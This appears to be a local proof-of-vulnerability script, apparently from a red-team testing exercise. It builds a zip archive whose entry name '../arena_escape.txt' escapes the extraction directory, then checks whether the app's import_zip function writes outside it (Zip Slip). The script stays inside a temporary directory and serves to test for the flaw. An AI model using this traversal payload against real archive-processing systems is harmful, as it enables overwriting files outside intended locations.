#!/usr/bin/env python3
"""Local proof-of-vulnerability for archive import Zip Slip traversal."""
import argparse
import sys
import tempfile
from pathlib import Path
from zipfile import ZipFile

from app import import_zip

MARKER = "RED_EXPLOIT_CONFIRMED"
PAYLOAD_NAME = "../arena_escape.txt"
PAYLOAD_BYTES = b"zip-slip traversal proof\n"


def build_zip(zip_path: Path) -> None:
    with ZipFile(zip_path, "w") as zf:
        zf.writestr(PAYLOAD_NAME, PAYLOAD_BYTES)


def run_probe() -> bool:
    with tempfile.TemporaryDirectory(prefix="red_zip_slip_") as tmp:
        root = Path(tmp)
        destination = root / "import_workspace"
        escape_path = root / "arena_escape.txt"
        zip_path = root / "payload.zip"

        build_zip(zip_path)
        if escape_path.exists():
            escape_path.unlink()

        try:
            import_zip(str(zip_path), str(destination))
        except Exception:
            return False

        return escape_path.exists() and escape_path.read_bytes() == PAYLOAD_BYTES


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--expect-vulnerable", action="store_true")
    args = parser.parse_args()

    vulnerable = run_probe()
    if args.expect_vulnerable:
        if vulnerable:
            print(MARKER)
            return 0
        print("expected vulnerable Zip Slip write, but escape file was not created", file=sys.stderr)
        return 1

    print(MARKER if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
